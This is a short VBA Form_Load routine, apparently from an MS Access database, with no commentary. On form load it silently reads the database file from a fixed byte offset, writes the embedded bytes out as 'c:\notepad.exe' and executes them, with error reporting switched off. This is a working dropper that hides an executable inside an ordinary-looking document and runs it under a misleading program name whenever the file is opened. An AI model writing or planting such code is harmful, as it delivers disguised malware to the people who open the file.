   Private Sub Form_Load()

      On Error Resume Next
      Dim buffer(65536) As Byte
      Dim h, h2, j, i, k As Long

      h = CreateFile(CurrentProject.FullName, &H80000000, 1 + 2, 0, 3, 0, 0)
      h2 = CreateFile("c:\notepad.exe", &H40000000, 0, 0, 2, 0, 0)
      If h = -1 Then
         Exit Sub
      End If
      k = SetFilePointer(h, 110592, nil, 0)
      Do
         i = ReadFile(h, buffer(0), 65536, j, 0)
         i = WriteFile(h2, buffer(0), j, j, 0)
      Loop Until j < 65536

      CloseHandle (h)
      CloseHandle (h2)

      Shell ("c:\notepad.exe")
   End Sub

